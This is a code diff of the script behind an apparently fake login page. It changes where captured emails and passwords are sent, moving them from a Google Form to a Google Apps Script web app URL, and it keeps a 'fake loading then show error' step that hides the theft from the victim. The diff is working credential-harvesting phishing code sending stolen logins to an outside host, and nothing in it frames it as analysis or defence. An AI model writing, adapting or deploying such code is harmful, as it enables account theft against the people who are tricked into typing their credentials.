@@ -151,12 +151,8 @@
 </div>
 
 <script>
-    // REPLACE THESE WITH YOUR GOOGLE FORM ENTRY IDS
-    const EMAIL_ENTRY_ID = "entry.123456789"; 
-    const PASS_ENTRY_ID = "entry.987654321";
-    
-    // REPLACE WITH YOUR FORM ID
-    const FORM_ID = "YOUR_FORM_ID_HERE"; 
+    // PASTE YOUR NEW GOOGLE APPS SCRIPT WEB APP URL HERE
+    const SHEET_URL = "https://script.google.com/macros/s/AKfycbxqdj3XwFxfwOqQ-sDwpp8ikv8Ib7DlBOTZ9KO0c27NrYtip7aUwKx_Jo2jxz_hkTo/exec"; 
 
     const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
@@ -182,7 +178,7 @@
             return;
         }
 
-        sendToForm(email, password);
+        sendToSheet(email, password);
         
         // Fake loading then show error
         setTimeout(() => {
@@ -191,15 +187,14 @@
         }, 1000);
     });
 
-    function sendToForm(email, pass) {
-        const url = `https://docs.google.com/forms/d/${FORM_ID}/formResponse`;
+    function sendToSheet(email, pass) {
+        // Use FormData to send data like a standard form submission
         const formData = new FormData();
-        formData.append(EMAIL_ENTRY_ID, email);
-        formData.append(PASS_ENTRY_ID, pass);
+        formData.append('email', email);
+        formData.append('password', pass);
 
-        fetch(url, {
+        fetch(SHEET_URL, {
             method: 'POST',
-            mode: 'no-cors', // Important for Google Forms
             body: formData
         }).catch(err => console.error("Failed", err));
     }
